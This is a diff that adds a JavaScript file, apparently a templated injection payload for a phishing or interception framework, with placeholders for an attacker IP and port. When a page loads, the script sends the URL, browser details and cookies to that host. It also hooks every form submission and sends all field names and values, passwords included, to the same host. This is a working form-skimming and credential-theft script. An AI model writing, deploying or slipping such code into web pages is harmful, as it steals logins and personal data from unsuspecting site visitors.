@@ -1,0 +1,104 @@
+;
+var _sender = "{ip}";
+var _userAgent = navigator.userAgent;
+var _browserPlatform = navigator.platform;
+var _url = window.location.href;
+var targetURL = 'https://<%= ip %>:<%= port %>/pagevisit/';
+var formURL = 'https://<%= ip %>:<%= port %>/forms/';
+var cookies = document.cookies;
+var _md5 = '';
+
+function createCORSRequest(method, url) {
+  var xhr = new XMLHttpRequest();
+  if ("withCredentials" in xhr) {
+    // Check if the XMLHttpRequest object has a "withCredentials" property.
+    // "withCredentials" only exists on XMLHTTPRequest2 objects.
+    xhr.open(method, url, true);
+  } else if (typeof XDomainRequest != "undefined") {
+    // Otherwise, check if XDomainRequest.
+    // XDomainRequest only exists in IE, and is IE's way of making CORS requests.
+    xhr = new XDomainRequest();
+    xhr.open(method, url);
+  } else {
+    // Otherwise, CORS is not supported by the browser.
+    xhr = null;
+  }
+  return xhr;
+}
+
+function pushPageVisit(){
+	var xhr = createCORSRequest('POST',targetURL);
+	if( !xhr ){
+		return;
+	}
+	xhr.setRequestHeader('Content-Type', 'application/json');
+	xhr.onload = function() {
+		if (xhr.status === 200 ) {
+			_md5 = xhr.response;
+		}
+	};
+	var request = JSON.stringify({
+		url: _url,
+		userAgent: _userAgent,
+		operatingSystem: _browserPlatform,
+		cookies: cookies
+	});	
+	xhr.send(request);
+}
+
+function pushForms(){
+	var formData = [];
+	var formCollection = document.getElementsByTagName("form");
+	//console.log(formCollection.length);
+	for(var i=0;i < formCollection.length; i++){
+		//console.log('adding form');
+		formCollection[i].addEventListener('submit', function(){
+
+				var forms = parent.document.getElementsByTagName("form");
+				
+				for( x=0; x < forms.length; x++){
+					var elements = forms[x].elements;
+					for(e=0;e<elements.length; e++){
+						formData.push({'type': elements[e].type, 'name': elements[e].name, 'value':elements[e].value});
+					}
+				}
+
+				var xhr = createCORSRequest('POST',formURL);
+					if( !xhr ){
+						return;
+					}
+					xhr.setRequestHeader('Content-Type', 'application/json');
+					xhr.onload = function() {
+						if (xhr.status === 200 ) {
+						}
+					};
+					
+				var request = JSON.stringify({
+		            sender: _sender,
+                    url: _url,
+					userAgent: _userAgent,
+					data: formData,
+					cookies: cookies,
+					link: _md5
+				});	
+
+				xhr.send(request);
+		}, false);
+	}
+};
+
+// window.addEventListener("onbeforeunload", function(e){
+// 	pushForms();
+// 	event.preventDefault();
+// } );
+if (document.readyState === "complete" 
+ || document.readyState === "loaded" 
+ || document.readyState === "interactive") {
+    pushPageVisit();
+    pushForms();
+}else{
+    document.addEventListener("DOMContentLoaded", function(event) {
+        pushPageVisit();
+        pushForms();
+    });
+}
